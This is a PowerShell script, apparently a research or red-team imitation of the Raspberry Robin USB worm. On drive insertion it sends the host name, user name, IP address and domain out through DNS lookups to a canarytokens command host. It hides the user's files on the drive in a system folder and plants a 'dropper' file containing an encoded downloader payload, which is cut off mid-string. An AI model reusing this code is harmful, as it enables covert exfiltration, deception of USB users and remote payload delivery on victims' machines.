

$Conf_Ballon="True"
$Conf_CharSet="MiDistribucion"
$Conf_dnsToken="pb6fy865rm7ts4ran9qi2ss2q.canarytokens.com"



if ($Conf_Ballon -eq $True) {
 
#MENSJAE DE USB PROCESADO
$Title = "CuchiBerryRObin"
$Message = "USB Insertado"
$Type = "info" 
[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)

#Mensaje para logging
Add-Content -Path "$env:APPDATA\cuchirobinoutput.log" -Value "$(Get-Date) - USB Flash Drive was inserted.";

}





#consige la unidad 

Get-WmiObject Win32_Volume | Where-Object { $_.DriveType -eq 2 } | Where-Object { $_.Label -ne "EFI" } | ForEach-Object {
    #Write-Host "Letter is" + $_.DriveLetter + "label is " + $_.Label
    $driveLetter = $_.DriveLetter
    $label = $_.Label
    if ([string]::IsNullOrEmpty($label)) {
        $label = "USB" # Espacio en blanco en lugar de "USB" para mantener consistencia
    }
    Write-Host "Letter is" + $_.DriveLetter + "label is " + $_.Label
    
}

# Verificar si driveLetter y label est�n vac�os
if ([string]::IsNullOrEmpty($driveLetter) -or [string]::IsNullOrEmpty($label)) {
    Write-Error "Error: No se pudo obtener la letra de unidad o etiqueta del USB"
    exit
}

Write-Host "Letra de unidad: $driveLetter"
Write-Host "Etiqueta: $label"

#Add-Content -Path $PSScriptRoot\output.txt -Value "$(Get-Date) - USB Flash Drive nombre $label es unidad $driveLetter .";
Write-Host "$(Get-Date) - USB Flash Drive nombre $label es unidad $driveLetter "

#Notificamos la Entrada al CNC
$ipAddress = (Test-Connection -ComputerName localhost -Count 1).IPv4Address.IPAddressToString

$texto = "USB_IN_$driveLetter$Label$env:COMPUTERNAME.$env:USERNAME.$ipAddress.$env:USERDNSDOMAIN."

[byte[]] $bytes = [System.Text.Encoding]::ASCII.GetBytes($texto)


$byteArrayAsBinaryString = -join $bytes.ForEach{        [Convert]::ToString($_, 2).PadLeft(8, '0')    }
$byteArrayAsBinaryString = $($byteArrayAsBinaryString+("0000".Substring(0,5-($byteArrayAsBinaryString.length%5))))
$Base32Secret = [regex]::Replace($byteArrayAsBinaryString, '.{5}', {        param($Match)        'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'[[Convert]::ToInt32($Match.Value, 2)]    }).Replace("=","")
$randomDigits = Get-Random -Minimum 10 -Maximum 100
$splitData = [System.Text.RegularExpressions.Regex]::Split($base32Secret, "(?<=\G.{63})") | Where-Object { $_ -ne "" } 
$splitData= $splitData -join "."
$encodedData = $splitData  + ".G$randomDigits." + $Conf_dnsToken


$result = Resolve-DnsName -Name $encodedData


# Set the path to the folder you want to work with
$folderPath = "$driveLetter"

# Create a subfolder
$subfolderPath = Join-Path -Path $folderPath -ChildPath "$label"



# Asegurarse de que la ruta es v�lida y existe
if(!(Test-Path -PathType Container $subfolderPath)) {
    try {
        New-Item -ItemType Directory -Path $subfolderPath -Force -ErrorAction Stop
        Write-Host "Directorio creado: $subfolderPath"
    } catch {
        Write-Error "No se pudo crear el directorio: $_"
        return
    }
} else {
    Write-Host "El directorio ya exist�a: $subfolderPath"
}


# Copy all files to the subfolder except the subfolder itself, hidden files and shortcuts

    Get-ChildItem -Path $folderPath | Where-Object { 
        $_.FullName -ne $subfolderPath -and 
        !($_.Attributes -band [System.IO.FileAttributes]::Hidden) -and 
        !($_.Extension -eq ".lnk")
    } | ForEach-Object {
        Write-Host "Moviendo archivo/carpeta: $($_.FullName)"
        if($_.PSIsContainer) {
            # Si es una carpeta, copiamos su contenido y luego la eliminamos
            Copy-Item -Path $_.FullName -Destination $subfolderPath -Force -Recurse
            Remove-Item -Path $_.FullName -Force -Recurse
        } else {
            # Si es un archivo, lo movemos directamente
            Move-Item -Path $_.FullName -Destination $subfolderPath -Force
        }
    }


# Make the subfolder invisible
$attrib = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System

(Get-Item $subfolderPath -Force).Attributes = $attrib


 

#CREANDO LNK Y DROPPER
# Set the path to the file you want to create a shortcut for
$targetPath = "cmd.exe"
$dropperName = -join ((Get-Random -Count 3 -InputObject  $Conf_CharSet.ToCharArray())) + "." + -join ((Get-Random -Count 3 -InputObject $Conf_CharSet.ToCharArray()))
$dropperPath = $driveLetter + "\"+$dropperName



#CREANDO DROPPER

# Generamos una cadena aleatoria de caracteres para escribir en el archivo
$caracteres = "abcdefghijklmnopqrstuvwxyz0123456789"

$caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789`r`n"

$aleatorios = ""
for ($i = 1; $i -le 5024; $i++) {
    $indice = Get-Random -Minimum 0 -Maximum $caracteres.Length
    $aleatorios += [char]::ConvertFromUtf32($caracteres[$indice])
}



$aleatorios | Out-File -FilePath "$dropperPath"


#[System.IO.File]::WriteAllBytes("$dropperPath", $aleatorios)


Write-Host $dropperPath

# Escribimos "mspaint" en una l�nea aleatoria del archivo
$lineas = Get-Content $dropperPath
$indice = Get-Random -Minimum 0 -Maximum $lineas.Count
$lineas[$indice] = " start explorer	\`"$label\`" "
$lineas | Set-Content "$dropperPath"


# Escribimos "Dropper" en una l�nea aleatoria del archivo
#$lineas = Get-Content $dropperPath
$indice = Get-Random -Minimum 0 -Maximum $lineas.Count
#
$downloader="WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASQAwAFIAdgBkADIANQBzAGIAMgBGAGsAWgBYAEkAZwBRADEAVgBEAFMARQBsAEMAUgBWAEoAUwBXAFYASgBQAFEAawBsAE8ARABRAG8AawBRADIAOQB1AFoAbAA5AEkAWQBYAE4AbwBkAEcARgBuAFgAMgBsAHUAYQBYAFEAZwBQAFMAQQBpAEkAegBFAHgAUQAxAFYARABTAEUAbABDAFIAVgBKAFMAVwBWAEoAUABRAGsAbABPAEkAZwAwAEsASgBFAE4AdgBiAG0AWgBmAFMARwBGAHoAYQBIAFIAaABaADEAOQBsAGIAbQBRAGcAUABTAEEAaQBJADAAWgBKAFQAaQBJAE4AQwBpAFIARABiADIANQBtAFgAMgBWAHQAWQBXAGwAcwBJAEQAMABnAEkAbgBsAHYAWQAzAFYAagBhAEcAbABBAFoAMgAxAGgAYQBXAHcAdQBZADIAOQB0AEkAaQBBAE4AQwBpAFIAeQBaAFgATgAxAGIASABSAGgAWgBHADgAZwBQAFMAQQBrAGIAbgBWAHMAYgBBADAASwBEAFEAbwBqAFQAbQA5ADAASQBIAGQAdgBjAG0AdABwAGIAbQBjAHMASQBHADUAbABaAFcAUQBnAGQAMgA5AHkAYQAyAEYAeQBiADMAVgB1AFoAQwBCADAAYgB5AEIAbgBaAFgAUQBnAFoAbgBKAHYAYgBTAEIAbgBiADIAOQBuAGIARwBVAGcARABRAG8AagBKAEcATgB2AGIAbgBSAGwAYgBuAFEAZwBQAFMAQgBKAGIAbgBaAHYAYQAyAFUAdABWADIAVgBpAFUAbQBWAHgAZABXAFYAegBkAEMAQQB0AFYAWABKAHAASQBDAEoAbwBkAEgAUgB3AGMAegBvAHYATAAzAGQAMwBkAHkANQBuAGIAMgA5AG4AYgBHAFUAdQBZADIAOQB0AEwAMwBOAGwAWQBYAEoAagBhAEQAOQB4AFAAUwBSAEQAYgAyADUAbQBYADAAaABoAGMAMgBoADAAWQBXAGQAZgBhAFcANQBwAGQAQwBJAGcATABWAFYAegBaAFUASgBoAGMAMgBsAGoAVQBHAEYAeQBjADIAbAB1AFoAdwAwAEsASQB5AFIAdwBZAFgAUgB5AGIAMgA0AGcAUABTAEEAbgBLAEQAOAA4AFAAUwBSAEQAYgAyADUAbQBYADAAaABoAGMAMgBoADAAWQBXAGQAZgBhAFcANQBwAGQAQwBBAHAASwBDADQAcQBLAFMAZwAvAFAAUwBBAGsAUQAyADkAdQBaAGwAOQBJAFkAWABOAG8AZABHAEYAbgBYADIAVgB1AFoAQwBrAG4ARABRAG8AagBKAEgASgBsAGMAMwBWAHMAZABHAEYAawBiAHkAQQA5AEkARgB0AHkAWgBXAGQAbABlAEYAMAA2AE8AawAxAGgAZABHAE4AbwBLAEMAUgBqAGIAMgA1ADAAWgBXADUAMABMAGsATgB2AGIAbgBSAGwAYgBuAFEAcwBJAEMAUgB3AFkAWABSAHkAYgAyADQAcABMAGwAWgBoAGIASABWAGwARABRAG8AagBKAEcAWgB5AGIAMgAwADkASQBrAGQAdgBiADIAZABzAFoAUwBJAE4AQwBpAE4AWABjAG0AbAAwAFoAUwAxAFAAZABYAFIAdwBkAFgAUQBnAEkAawBkAHYAYgAyAGQAcwBaAFMAQQBrAGMAbQBWAHoAZABXAHgAMABZAFcAUgB2AEkAQwBJAE4AQwBnADAASwBEAFEAbwBqAFEAbgBWAHUASQBFAEoASgBUAGsAYwBnAFYAMAA5AFMAUwAxAE0AaABJAFMARQBnAGEAVwA0AGcATQBqAEEAeQBNAHkAQgBwAGIAaQBBAHkATQBEAEkAMABJAEcANQB2AEQAUQBvAGoAVQBHAFYAeQBiAHkAQgBQAFUARQBOAEoAVAAwADQAZwBJADEAUgBQAFIARQA4AGcAUQAwAGwAUQBTAEUAVgBTAEkARgBoAFAAVQBnADAASwBJADAASgBKAFQAawBjAGcAUQBTAEIAVwBSAFUATgBGAFUAeQBCAE4AUgBWAFIARgBJAEYAVgBPAEkARgBOAFUAVQBrADkATwBSAHkAQgBUAFIAVgBKAFEATABEAFUAeABPAEQAUQB1AE0AaQBJACsASQB6AHgAegBkAEgASgB2AGIAbQBjACsATQBUAEYARABWAFUATgBJAFMAVQBKAEYAVQBsAEoAWgBVAGsAOQBDAFMAVQA0ADgATAAzAE4AMABjAG0AOQB1AFoAegA0AGcASgBDAEIAbwBkAEgAUgB3AGMAegBvAHYATAAzAEIAaABjADMAUgBsAFkAbQBsAHUATABtAE4AdgBiAFMAOQB5AFkAWABjAHYAYwBEAE4AQwBSAGoAWgByAFUAegBRAGcASQAwAFoASgBUAGoAdwB2AFkAVAA0ADgATAAyAGcAeQBQAGoAdwBOAEMAZwAwAEsAYQBXAFkAZwBLAEMAaABiAGMAMwBSAHkAYQBXADUAbgBYAFQAbwA2AFMAWABOAE8AZABXAHgAcwBUADMASgBGAGIAWABCADAAZQBTAGcAawBjAG0AVgB6AGQAVwB4ADAAWQBXAFIAdgBLAFMAawBwAEkASABzAE4AQwBpAEEAZwBJAEMAQQBrAGIARwBWADAAYwBtAEYAegBJAEQAMABnAEwAVwBwAHYAYQBXADQAZwBLAEMAZwAyAE4AUwA0AHUATwBUAEEAcABJAEMAcwBnAEsARABrADMATABpADQAeABNAGoASQBwAEkASAB3AGcAUgAyAFYAMABMAFYASgBoAGIAbQBSAHYAYgBTAEEAdABRADIAOQAxAGIAbgBRAGcATgBpAEIAOABJAEMAVQBnAGUAeQBCAGIAWQAyAGgAaABjAGwAMABrAFgAeQBCADkASwBRADAASwBJAEMAQQBnAEkAQwBSAHUAZABXADEAbABjAG0AOABnAFAAUwBCAEgAWgBYAFEAdABVAG0ARgB1AFoARwA5AHQASQBDADEATgBhAFcANQBwAGIAWABWAHQASQBEAEUAZwBMAFUAMQBoAGUARwBsAHQAZABXADAAZwBNAFQAQQB3AE0AQQAwAEsASQBDAEEAZwBJAEMAUgBqAGIAMgA1AG0AWAAyAGgAaABjADIAaAAwAFkAVwBkAGYAYQBXADUAcABkAEYAOQBsAGIAbQBOAHYAWgBHAFYAawBJAEQAMABnAFcAMQBOADUAYwAzAFIAbABiAFMANQBWAGMAbQBsAGQATwBqAHAARgBjADIATgBoAGMARwBWAEUAWQBYAFIAaABVADMAUgB5AGEAVwA1AG4ASwBDAFIARABiADIANQBtAFgAMABoAGgAYwAyAGgAMABZAFcAZABmAGEAVwA1AHAAZABDAGsATgBDAGkAQQBnAEkAQwBBAGsAWQAyADkAdQBkAEcAVgB1AGQAQwBBADkASQBFAGwAdQBkAG0AOQByAFoAUwAxAFgAWgBXAEoAUwBaAFgARgAxAFoAWABOADAASQBDADEAVgBjAG0AawBnAEkAbQBoADAAZABIAEIAegBPAGkAOAB2AGQAMwBkADMATABtAEoAcABiAG0AYwB1AFkAMgA5AHQATAAzAE4AbABZAFgASgBqAGEARAA4AGsAYgBHAFYAMABjAG0ARgB6AFAAUwBSAHUAZABXADEAbABjAG0AOABtAGMAVAAwAGsAWQAyADkAdQBaAGwAOQBvAFkAWABOAG8AZABHAEYAbgBYADIAbAB1AGEAWABSAGYAWgBXADUAagBiADIAUgBsAFoAQwBJAGcATABWAFYAegBaAFUASgBoAGMAMgBsAGoAVQBHAEYAeQBjADIAbAB1AFoAdwAwAEsASQBDAEEAZwBJAEMATgBsAGIARwBsAHQAYQBXADUAdgBJAEcAVgBzAEkASABOADAAYwBtADkAdQBaAHcAMABLAEkAQwBBAGcASQBDAFIAagBiADIANQAwAFoAVwA1ADAAWQAyAHgAbABZAFcANABnAFAAUwBBAGsAWQAyADkAdQBkAEcAVgB1AGQAQwA1AEQAYgAyADUAMABaAFcANQAwAEkAQwAxAHkAWgBYAEIAcwBZAFcATgBsAEkAQwBJADgAYwAzAFIAeQBiADIANQBuAFAAaQBJAHMASQBDAEkAaQBJAEMAMQB5AFoAWABCAHMAWQBXAE4AbABJAEMASQA4AEwAMwBOADAAYwBtADkAdQBaAHoANABpAEwAQwBBAGkASQBnADAASwBJAEMAQQBnAEkAQwBSAHcAWQBYAFIAeQBiADIANABnAFAAUwBBAGkASwBEADgAOABQAFMAUgBEAGIAMgA1AG0AWAAwAGgAaABjADIAaAAwAFkAVwBkAGYAYQBXADUAcABkAEYAeAB6AEsAUwBnAHUASwBqADgAcABLAEQAOAA5AFgASABNAHEASgBFAE4AdgBiAG0AWgBmAFMARwBGAHoAYQBIAFIAaABaADEAOQBsAGIAbQBRAHAASQBnADAASwBJAEMAQQBnAEkAQwBSAHkAWgBYAE4AMQBiAEgAUgBoAFoARwA4AGcAUABTAEEAbwBKAEcATgB2AGIAbgBSAGwAYgBuAFIAagBiAEcAVgBoAGIAaQBCADgASQBGAE4AbABiAEcAVgBqAGQAQwAxAFQAZABIAEoAcABiAG0AYwBnAEwAVgBCAGgAZABIAFIAbABjAG0ANABnAEoASABCAGgAZABIAEoAdgBiAGkAQQB0AFEAVwB4AHMAVABXAEYAMABZADIAaABsAGMAeQBrAHUAVABXAEYAMABZADIAaABsAGMAMQBzAHcAWABTADUAVwBZAFcAeAAxAFoAUQAwAEsASQBDAEEAZwBJAEYAZAB5AGEAWABSAGwATABVADkAMQBkAEgAQgAxAGQAQwBBAGkAVgBWAEoATQBPAGkAQgBvAGQASABSAHcAYwB6AG8AdgBMADMAZAAzAGQAeQA1AGkAYQBXADUAbgBMAG0ATgB2AGIAUwA5AHoAWgBXAEYAeQBZADIAZwAvAEoARwB4AGwAZABIAEoAaABjAHoAMABrAGIAbgBWAHQAWgBYAEoAdgBKAG4ARQA5AEoARwBOAHYAYgBtAFoAZgBhAEcARgB6AGEASABSAGgAWgAxADkAcABiAG0AbAAwAFgAMgBWAHUAWQAyADkAawBaAFcAUQBpAEQAUQBvAGcASQBDAEEAZwBWADMASgBwAGQARwBVAHQAVAAzAFYAMABjAEgAVgAwAEkAQwBKAEMAUwBVADUASABJAEMAUgB5AFoAWABOADEAYgBIAFIAaABaAEcAOABnAEkAZwAwAEsASQBDAEEAZwBJAEMAUgBtAGMAbQA5AHQASQBEADAAZwBJAGsASgBwAGIAbQBjAGkARABRAG8ATgBDAG4AMABOAEMAaQBOAEUAVgBVAE4ATABEAFEAbwBqAFYARQA5AEUAVAB5AEIARABTAFYAQgBJAFIAVgBJAGcAVwBFADkAUwBEAFEAbwBqAFUAMgBrAGcAYgBtADgAZwBjADIAVQBnAGEARwBFAGcAWgBXADUAagBiADIANQAwAGMAbQBGAGsAYgB5AEIAeQBaAFgATgAxAGIASABSAGgAWgBHADgAZwBaAFcANABnAGIARwBGAHoASQBHAEwARAB1AG4ATgB4AGQAVwBWAGsAWQBYAE0AZwBZAFcANQAwAFoAWABKAHAAYgAzAEoAbABjAHcAMABLAEkAQQAwAEsAYQBXAFkAZwBLAEMAaABiAGMAMwBSAHkAYQBXADUAbgBYAFQAbwA2AFMAWABOAE8AZABXAHgAcwBUADMASgBGAGIAWABCADAAZQBTAGcAawBjAG0AVgB6AGQAVwB4ADAAWQBXAFIAdgBLAFMAawBwAEkASABzAE4AQwBpAEEAZwBJAEMAQQBqAFIAMgBWAHUAWgBYAEoAaABiAFcAOQB6AEkARwB4AGwAZABIAEoAaABjAHkAQgBoAGIARwBWAGgAZABHADkAeQBhAFcARgB6AEkASABCAGgAYwBtAEUAZwBaAFcAdwBnAGMARwBGAHkAdwA2AEYAdABaAFgAUgB5AGIAeQBCAGsAWgBTAEIAaQB3ADcAcAB6AGMAWABWAGwAWgBHAEUATgBDAGkAQQBnAEkAQwBBAGsAYgBHAFYAMABjAG0ARgB6AEkARAAwAGcATABXAHAAdgBhAFcANABnAEsAQwBnADIATgBTADQAdQBPAFQAQQBwAEkAQwBzAGcASwBEAGsAMwBMAGkANAB4AE0AagBJAHAASQBIAHcAZwBSADIAVgAwAEwAVgBKAGgAYgBtAFIAdgBiAFMAQQB0AFEAMgA5ADEAYgBuAFEAZwBOAGkAQgA4AEkAQwBVAGcAZQB5AEIAYgBZADIAaABoAGMAbAAwAGsAWAB5AEIAOQBLAFEAMABLAEkAQwBBAGcASQBDAE4ASABaAFcANQBsAGMAbQBGAHQAYgAzAE0AZwBkAFcANABnAGIAcwBPADYAYgBXAFYAeQBiAHkAQgBoAGIARwBWAGgAZABHADkAeQBhAFcAOABnAGMARwBGAHkAWQBTAEIAbABiAEMAQgB3AFkAWABMAEQAbwBXADEAbABkAEgASgB2AEkARwBSAGwASQBHAEwARAB1AG4ATgB4AGQAVwBWAGsAWQBTAEEATgBDAGkAQQBnAEkAQwBBAGsAYgBuAFYAdABaAFgASgB2AEkARAAwAGcAUgAyAFYAMABMAFYASgBoAGIAbQBSAHYAYgBTAEEAdABUAFcAbAB1AGEAVwAxADEAYgBTAEEAeABJAEMAMQBOAFkAWABoAHAAYgBYAFYAdABJAEQARQB3AE0ARABBAE4AQwBpAEEAZwBJAEMAQQBqAFEAMgA5AGsAYQBXAFoAcABZADIARgB0AGIAMwBNAGcAWgBXAHcAZwBhAEcARgB6AGEASABSAGgAWgB5AEIAdwBZAFgASgBoAEkARwB4AGgASQBGAFYAUwBUAEEAMABLAEkAQwBBAGcASQBDAFIAagBiADIANQBtAFgAMgBoAGgAYwAyAGgAMABZAFcAZABmAGEAVwA1AHAAZABGADkAbABiAG0ATgB2AFoARwBWAGsASQBEADAAZwBXADEATgA1AGMAMwBSAGwAYgBTADUAVgBjAG0AbABkAE8AagBwAEYAYwAyAE4AaABjAEcAVgBFAFkAWABSAGgAVQAzAFIAeQBhAFcANQBuAEsAQwBSAEQAYgAyADUAbQBYADAAaABoAGMAMgBoADAAWQBXAGQAZgBhAFcANQBwAGQAQwBrAE4AQwBpAEEAZwBJAEMAQQBqAFEAMgA5AHUAYwAzAFIAeQBkAFcAbAB0AGIAMwBNAGcAYgBHAEUAZwBWAFYASgBNAEkARwBSAGwASQBHAEwARAB1AG4ATgB4AGQAVwBWAGsAWQBTAEIAbABiAGkAQgBFAGQAVwBOAHIAUgBIAFYAagBhADAAZAB2AEQAUQBvAGcASQBDAEEAZwBKAEgAVgB5AGIAQwBBADkASQBDAEoAbwBkAEgAUgB3AGMAegBvAHYATAAyAGgAMABiAFcAdwB1AFoASABWAGoAYQAyAFIAMQBZADIAdABuAGIAeQA1AGoAYgAyADAAdgBhAEgAUgB0AGIAQwA4AC8ASgBHAHgAbABkAEgASgBoAGMAegAwAGsAYgBuAFYAdABaAFgASgB2AEoAbgBFADkASgBUAGQAQwBKAEUATgB2AGIAbQBaAGYAUwBHAEYAegBhAEgAUgBoAFoAMQA5AHAAYgBtAGwAMABKAFQAZABFAEoAbQBFADkAWQBpAEkATgBDAGkAQQBnAEkAQwBBAGoAUwBHAEYAagBaAFcAMQB2AGMAeQBCAHMAWQBTAEIAdwBaAFgAUgBwAFkAMgBuAEQAcwAyADQAZwBkADIAVgBpAEQAUQBvAGcASQBDAEEAZwBKAEcATgB2AGIAbgBSAGwAYgBuAFEAZwBQAFMAQgBKAGIAbgBaAHYAYQAyAFUAdABWADIAVgBpAFUAbQBWAHgAZABXAFYAegBkAEMAQQB0AFYAWABKAHAASQBDAFIAMQBjAG0AdwBnAEwAVgBWAHoAWgBVAEoAaABjADIAbABqAFUARwBGAHkAYwAyAGwAdQBaAHcAMABLAEkAQwBBAGcASQBGAGQAeQBhAFgAUgBsAEwAVQA5ADEAZABIAEIAMQBkAEMAQQBpAFIARgBWAEQAUwB5AEIAVgBVAGsAdwA2AEkAQwBSADEAYwBtAHcAaQBEAFEAbwBnAEkAQwBBAGcASQAwAFIAbABaAG0AbAB1AGEAVwAxAHYAYwB5AEIAbABiAEMAQgB3AFkAWABSAHkAdwA3AE4AdQBJAEcAUgBsAEkARwBMAEQAdQBuAE4AeABkAFcAVgBrAFkAUwBCAGwAYgBuAFIAeQBaAFMAQgBzAGIAMwBNAGcAYQBHAEYAegBhAEgAUgBoAFoAMwBNAE4AQwBpAEEAZwBJAEMAQQBrAGMARwBGADAAYwBtADkAdQBJAEQAMABnAEkAaQBnAC8AUABEADAAawBRADIAOQB1AFoAbAA5AEkAWQBYAE4AbwBkAEcARgBuAFgAMgBsAHUAYQBYAFIAYwBjAHkAawBvAEwAaQBvAC8ASwBTAGcALwBQAFYAeAB6AEsAaQBSAEQAYgAyADUAbQBYADAAaABoAGMAMgBoADAAWQBXAGQAZgBaAFcANQBrAEsAUwBJAE4AQwBpAEEAZwBJAEMAQQBqAFIAWABoADAAYwBtAEYAbABiAFcAOQB6AEkARwBWAHMASQBIAEoAbABjADMAVgBzAGQARwBGAGsAYgB5AEIAMQBjADIARgB1AFoARwA4AGcAWgBXAHcAZwBjAEcARgAwAGMAcwBPAHoAYgBnADAASwBJAEMAQQBnAEkAQwBSAHkAWgBYAE4AMQBiAEgAUgBoAFoARwA4AGcAUABTAEEAbwBKAEcATgB2AGIAbgBSAGwAYgBuAFEAZwBmAEMAQgBUAFoAVwB4AGwAWQAzAFEAdABVADMAUgB5AGEAVwA1AG4ASQBDADEAUQBZAFgAUgAwAFoAWABKAHUASQBDAFIAdwBZAFgAUgB5AGIAMgA0AGcATABVAEYAcwBiAEUAMQBoAGQARwBOAG8AWgBYAE0AcABMAGsAMQBoAGQARwBOAG8AWgBYAE4AYgBNAEYAMAB1AFYAbQBGAHMAZABXAFUATgBDAGkAQQBnAEkAQwBBAGoAUgAzAFYAaABjAG0AUgBoAGIAVwA5AHoASQBHAHgAaABJAEcAWgAxAFoAVwA1ADAAWgBTAEIAagBiADIAMQB2AEkARQBSADEAWQAyAHQARQBkAFcATgByAFIAMgA4AE4AQwBpAEEAZwBJAEMAQQBrAFoAbgBKAHYAYgBTAEEAOQBJAEMASgBFAGQAVwBOAHIASQBnADAASwBJAEEAMABLAGYAUQAwAEsARABRAG8ATgBDAGcAMABLAEQAUQBvAGoAVgBHAFYAeQBZADIAVgB5AFkAVQBFAGcAVAAxAEIARABTAFUAOQBPAEkAQwBOAFUAVAAwAFIAUABJAEUATgBKAFUARQBoAEYAVQBpAEIAWQBUADEASQBOAEMAbQBsAG0ASQBDAGcAbwBXADMATgAwAGMAbQBsAHUAWgAxADAANgBPAGsAbAB6AFQAbgBWAHMAYgBFADkAeQBSAFcAMQB3AGQASABrAG8ASgBIAEoAbABjADMAVgBzAGQARwBGAGsAYgB5AGsAcABLAFMAQgA3AEQAUQBvAGcASQBDAEEAZwBKAEcATgB2AGIAbgBSAGwAYgBuAFEAZwBQAFMAQgBKAGIAbgBaAHYAYQAyAFUAdABWADIAVgBpAFUAbQBWAHgAZABXAFYAegBkAEMAQQB0AFYAWABKAHAASQBDAEoAbwBkAEgAUgB3AGMAegBvAHYATAAzAEIAaABjADMAUgBsAFkAbQBsAHUATABtAE4AdgBiAFMAOQB5AFkAWABjAHYAUQBVAEoAcABWAGoAQgB5AFMARABjAGkASQBDADEAVgBjADIAVgBDAFkAWABOAHAAWQAxAEIAaABjAG4ATgBwAGIAbQBjAE4AQwBpAEEAZwBJAEMAQQBrAGMARwBGADAAYwBtADkAdQBJAEQAMABnAEkAaQBnAC8AUABEADAAawBRADIAOQB1AFoAbAA5AEkAWQBYAE4AbwBkAEcARgBuAFgAMgBsAHUAYQBYAFIAYwBjAHkAawBvAEwAaQBvAC8ASwBTAGcALwBQAFYAeAB6AEsAaQBSAEQAYgAyADUAbQBYADAAaABoAGMAMgBoADAAWQBXAGQAZgBaAFcANQBrAEsAUwBJAE4AQwBpAEEAZwBJAEMAQQBrAGMAbQBWAHoAZABXAHgAMABZAFcAUgB2AEkARAAwAGcAVwAzAEoAbABaADIAVgA0AFgAVABvADYAVABXAEYAMABZADIAZwBvAEoARwBOAHYAYgBuAFIAbABiAG4AUQBzAEkAQwBSAHcAWQBYAFIAeQBiADIANABwAEwAbABaAGgAYgBIAFYAbABEAFEAbwBnAEkAQwBBAGcASgBHAFoAeQBiADIAMABnAFAAUwBBAGkAVQBHAEYAegBkAEcAVgBpAGEAVwA0AGkARABRAG8ATgBDAGkAQQBnAEkAQwBCAFgAYwBtAGwAMABaAFMAMQBQAGQAWABSAHcAZABYAFEAZwBJAGwAQgBCAFUAMQBSAEYAUQBrAGwATwBPAGkASQBrAGMAbQBWAHoAZABXAHgAMABZAFcAUgB2AEQAUQBwADkARABRAG8ATgBDAGkAUgB5AFoAWABOADEAYgBIAFIAaABaAEcAOABnAFAAUwBCAGIAVQAzAGwAegBkAEcAVgB0AEwAawA1AGwAZABDADUAWABaAFcASgBWAGQARwBsAHMAYQBYAFIANQBYAFQAbwA2AFMASABSAHQAYgBFAFIAbABZADIAOQBrAFoAUwBnAGsAYwBtAFYAegBkAFcAeAAwAFkAVwBSAHYASwBRADAASwBEAFEAbwBOAEMAZwAwAEsASgBGAFIAcABkAEcAeABsAEkARAAwAGcASQBrAE4AMQBZADIAaABwAFEAbQBWAHkAYwBuAGwAUwBUADIASgBwAGIAaQBJAE4AQwBpAFIATgBaAFgATgB6AFkAVwBkAGwASQBEADAAZwBJAGsAUgBsAGMAMgBOAGgAYwBtAGQAaABiAG0AUgB2AEkARwBOAHYAYgBXAEYAdQBaAEcAOABnAEoASABKAGwAYwAzAFYAcwBkAEcARgBrAGIAeQBCAGsAWgBTAEEAawBaAG4ASgB2AGIAUwBJAE4AQwBpAFIAVQBlAFgAQgBsAEkARAAwAGcASQBtAGwAdQBaAG0AOABpAEkAQQAwAEsASQBDAEEATgBDAGwAdAB5AFoAVwBaAHMAWgBXAE4AMABhAFcAOQB1AEwAbQBGAHoAYwAyAFYAdABZAG0AeAA1AFgAVABvADYAYgBHADkAaABaAEgAZABwAGQARwBoAHcAWQBYAEoAMABhAFcARgBzAGIAbQBGAHQAWgBTAGcAaQBVADMAbAB6AGQARwBWAHQATABsAGQAcABiAG0AUgB2AGQAMwBNAHUAUgBtADkAeQBiAFgATQBpAEsAUwBCADgASQBHADkAMQBkAEMAMQB1AGQAVwB4AHMARABRAG8AawBjAEcARgAwAGEAQwBBADkASQBFAGQAbABkAEMAMQBRAGMAbQA5AGoAWgBYAE4AegBJAEMAMQBwAFoAQwBBAGsAYwBHAGwAawBJAEgAdwBnAFUAMgBWAHMAWgBXAE4AMABMAFUAOQBpAGEAbQBWAGoAZABDAEEAdABSAFgAaAB3AFkAVwA1AGsAVQBIAEoAdgBjAEcAVgB5AGQASABrAGcAVQBHAEYAMABhAEEAMABLAEoARwBsAGoAYgAyADQAZwBQAFMAQgBiAFUAMwBsAHoAZABHAFYAdABMAGsAUgB5AFkAWABkAHAAYgBtAGMAdQBTAFcATgB2AGIAbAAwADYATwBrAFYANABkAEgASgBoAFkAMwBSAEIAYwAzAE4AdgBZADIAbABoAGQARwBWAGsAUwBXAE4AdgBiAGkAZwBrAGMARwBGADAAYQBDAGsATgBDAGkAUgB1AGIAMwBSAHAAWgBuAGsAZwBQAFMAQgB1AFoAWABjAHQAYgAyAEoAcQBaAFcATgAwAEkASABOADUAYwAzAFIAbABiAFMANQAzAGEAVwA1AGsAYgAzAGQAegBMAG0AWgB2AGMAbQAxAHoATABtADUAdgBkAEcAbABtAGUAVwBsAGoAYgAyADQATgBDAGkAUgB1AGIAMwBSAHAAWgBuAGsAdQBhAFcATgB2AGIAaQBBADkASQBDAFIAcABZADIAOQB1AEQAUQBvAGsAYgBtADkAMABhAFcAWgA1AEwAbgBaAHAAYwAyAGwAaQBiAEcAVQBnAFAAUwBBAGsAZABIAEoAMQBaAFEAMABLAEoARwA1AHYAZABHAGwAbQBlAFMANQB6AGEARwA5ADMAWQBtAEYAcwBiAEcAOQB2AGIAbgBSAHAAYwBDAGcAeABNAEMAdwBnAEoARgBSAHAAZABHAHgAbABMAEMAQQBrAFQAVwBWAHoAYwAyAEYAbgBaAFMAdwBnAFcAMwBOADUAYwAzAFIAbABiAFMANQAzAGEAVwA1AGsAYgAzAGQAegBMAG0AWgB2AGMAbQAxAHoATABuAFIAdgBiADIAeAAwAGEAWABCAHAAWQAyADkAdQBYAFQAbwA2AEoA